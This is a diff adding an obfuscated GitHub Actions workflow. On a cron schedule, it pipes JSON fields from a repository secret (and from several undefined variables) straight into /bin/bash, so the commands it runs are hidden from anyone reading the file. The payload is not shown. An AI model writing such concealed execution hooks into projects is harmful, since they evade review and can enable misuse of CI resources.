@@ -1,0 +1,26 @@
+name: hutujing8718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hutujing8718
+        env:
+          apbek605: ${{ secrets.apbek605 }}
+        run: |
+          echo $apbek605 | jq -r .aqdl5 | /bin/bash
+          echo $zfdhb0016 | jq -r .ibivg691 | /bin/bash
+          echo $eko42442 | jq -r .n31296 | /bin/bash
+          echo $i12335 | jq -r .md1 | /bin/bash
+          echo $v01001 | jq -r .ldrb793 | /bin/bash
+          echo $mjrv47 | jq -r .ft9 | /bin/bash
+          echo $xtha89074 | jq -r .xfsof91 | /bin/bash
+          echo $idaks048 | jq -r .qki9 | /bin/bash
+          echo $pgsy890 | jq -r .mqvd97391 | /bin/bash
+
